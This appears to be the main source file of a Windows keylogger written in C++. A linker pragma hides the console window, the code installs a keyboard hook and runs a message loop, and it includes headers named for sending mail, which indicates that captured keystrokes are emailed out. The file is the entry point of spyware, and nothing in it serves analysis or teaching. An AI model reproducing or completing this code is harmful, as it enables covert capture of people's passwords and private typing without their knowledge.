#pragma comment(linker,"/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include<Windows.h>
#include"IO.h"
#include"Timer.h"
#include"Send Mail.h"
#include"KeyBoard Hook.h"

using namespace std;

int main(int argc, char **argv)
{
	MSG msg;

	IO::make_dir(IO::get_our_path(true));

	install_hook();

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	mail_timer.stop();

	cin.get();
	return 0;
}